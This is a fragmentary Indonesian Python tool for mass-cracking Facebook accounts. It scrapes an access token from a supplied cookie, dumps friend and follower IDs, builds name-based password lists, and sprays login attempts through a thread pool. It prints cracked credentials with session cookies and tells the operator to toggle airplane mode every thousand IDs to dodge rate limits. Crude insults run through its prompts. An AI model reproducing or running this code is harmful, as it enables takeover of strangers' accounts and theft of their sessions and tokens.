...
for xd in range(10000):
	...
	g='AppleWebkit/530.17 (KHTML, seperti Gecko) Versi/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/530.17'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (Linux; Android 11; Nexus 6'
	...
	i='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
...
╚═════{m}•WARNING !!!{x}════════════════════════╝
               ╚═══════════╗o00═════════════•0^0•═════════════00o╗
                           ║  YA TUHAN JIKA DI JODOH KU MAKA     ║
                           ║    DEKATKAN LAH JIKA DIA BUKAN      ║
                           ║             JODOH KU                ║
                           ║               BATU😂                ║
                           ║      NOTE:BUDAYAKAN MEMBACA         ║{x}
                           ╚═════════════════════════════════════╝''')
...
def login():
	try:
		...
		try:
			...
			li = '# KONEKSI INTERNET ANDA BERMASALAH,SILAHKAN COLI TERLEBIH DAHULU,AGAR KONEKSI ANDA SETABIL'
...
def login_lagi334():
	try:
		...
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; U; Android 2.1-update1; en-us; Nexus One Build/EPF21B) AppleWebkit/530.17 (KHTML, seperti Gecko) Versi/4.0 Mobile Safari/530.17","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1))
		cok=open(".cok.txt", "w").write(cookie)
		print(f'  {x}[{h}•{x}]{hh} LOGIN BERHASIL....!!!!{x} ');time.sleep(1)
		print(f'  {x}[{h}•{x}]{hh} JALANKAN ULANG SCRIPNYA  python baru.py{x}  ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
		print(f'  %s[%sx%s]%s LO KURANG GANTENG BANG 😂 %s'%(x,k,x,m,x))
		exit()
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	...
	cetak(nel('\tSelamat Datang Bapak [green]%s[white] Yang Terhormat'%(my_name)))
	Liimmm_ID(f'({x}{k}✓{x}) ID ANDA : '+str(my_id))
	Liimmm_ID(f'({x}{k}✓{x}) IP ANDA  :{ip} ')
	print('')
...
def dump_massal():
	...
	try:
		...
		print(f'[x]{m} PERTEMANAN TIDAK PUBLIK {x}')
		time.sleep(3)
		back()
#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_pengikut():
...
def setting():
	...
	if hc in ['1','01']:
		...
		method.append('mobile')
	print('')
	_jembot_ = input('(!) INGIN TAMBAHKAN APLIKASI ( Y/T ) ')
	if _jembot_ in ['']:
		print('>> Pilih Yang Bener Kontol ')
		back()
		...
		taplikasi.append('no')
	pwplus=input('(!) INGIN TAMBAHKAN PASSWORD ( Y/T ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'   {m}•{k}•{h}•{x} {m}SEDANG MENENCARI REZEKI{x} {m}•{k}•{h}•{x}  ')
	print('')
	print(f'({h}✓{x}) HASIL    {h}OK{x}  TERSIMPAN DI : {h}OK/%s {x}'%(okc))
	print(f'({k}x{x}) HASIL    {k}CP{x}  TERSIMPAN DI : {k}CP/%s {x}'%(cpc))
	print(f'{x}(!) MAINKAN MODE PESAWAT SETIAP {m}1K{x} ID\n')
		...
		for yuzong in id2:
			...
			if len(nmf)<6:
				...
				if len(frs)<3:
					...
					pwv.append(frs+'bismillah')
					pwv.append(frs+'bangsad')
					pwv.append(frs+'indonesi')
					pwv.append(frs+'katasand')
					pwv.append(frs+'rahasia')
					pwv.append(frs+'sayang')
					pwv.append(frs+'kontol')
					pwv.append(frs+'321')
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan][✓][green] CRACK SELSAI.....[cyan] <<[white] '))
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\rLiimmm-ID {P}{b}{loop}{P}/{u}{len(id)}{P}/{P}{H}{ok}{P}/{P}/{k}{cp}{x}/{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{k} Liimmm_ID  CP {k} {idf} ⏩ {pw}{N}')     
				print(f'\r{h} ⏩ {ua}{N}')
				...
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 YJApp-ANDROID jp.co.yahoo.android .yjtop/3.123.0"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r{h} Liimmm-ID  OK {hh}{idf} ⏩ {pw} ⏩ {kuki}{N}')
					print(f'\r{h} ⏩ {ua}{N}')
...
#				os.popen('play-audio .cp.mp3')
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{H}[HANZ-XDX] {idf}|{pw}|{kuki}{N}')
...
def cek_apk(session,cookie):
	...
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] Maaf  tidak ada aplikasi aktif di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Apk 🎮 Aktif Ditambahkan pada"," Ditambahkan pada"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] Maaf tidak ada aplikasi kadaluarsa di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Apk 🎮 Kedaluwarsa"," Kedaluwarsa"),N))
